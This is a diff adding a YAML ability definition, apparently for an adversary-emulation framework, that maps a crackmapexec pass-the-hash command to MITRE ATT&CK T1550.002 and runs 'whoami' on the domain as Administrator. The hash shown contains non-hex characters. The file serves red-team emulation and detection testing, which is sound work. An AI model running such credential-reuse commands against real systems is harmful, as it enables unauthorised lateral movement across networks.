@@ -1,0 +1,17 @@
+---
+- id: 3e08ce272958e39325d1a9f4a2b71bda
+  name: crackmapexec Pass the Hash
+  description: 'command execute with crackmapexec
+
+    '
+  tactic: lateral-movement
+  technique:
+    attack_id: T1550.002
+    name: 'Use Alternate Authentication Material: Pass the Hash'
+  platforms:
+    windows:
+      cmd:
+        command: C:\CrackMapExecWin\crackmapexec.exe %userdnsdomain% -u Administrator
+          -H cc36cf7a8514893efccd3324464tkg1a -x whoami
+        payloads: []
+        cleanup: ''
